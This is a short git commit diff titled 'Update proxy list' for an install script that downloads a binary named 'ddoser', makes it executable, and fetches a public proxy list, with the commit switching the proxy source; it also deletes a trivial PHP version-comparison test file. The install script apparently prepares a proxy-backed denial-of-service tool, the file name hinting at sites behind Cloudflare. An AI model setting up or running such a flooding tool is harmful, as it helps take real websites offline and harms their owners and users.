f0c50a407b3fc7cd536861540c638f49fd678424
xIvan0ff <hrisivanov2@gmail.com>
2022-01-25 02:40:40 +0200

    Update proxy list

--- install_cf.sh
+++ install_cf.sh
@@ -1,3 +1,3 @@
 wget https://github.com/gingteam/ddoser/releases/download/latest/ddoser
 chmod +x ./ddoser
-wget https://raw.githubusercontent.com/shiftytr/proxy-list/master/https.txt
+wget https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt -O https.txt
--- test1.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-$current_version = '1.2';
-$remote_version = '1.1';
-
-echo version_compare($remote_version, $current_version);
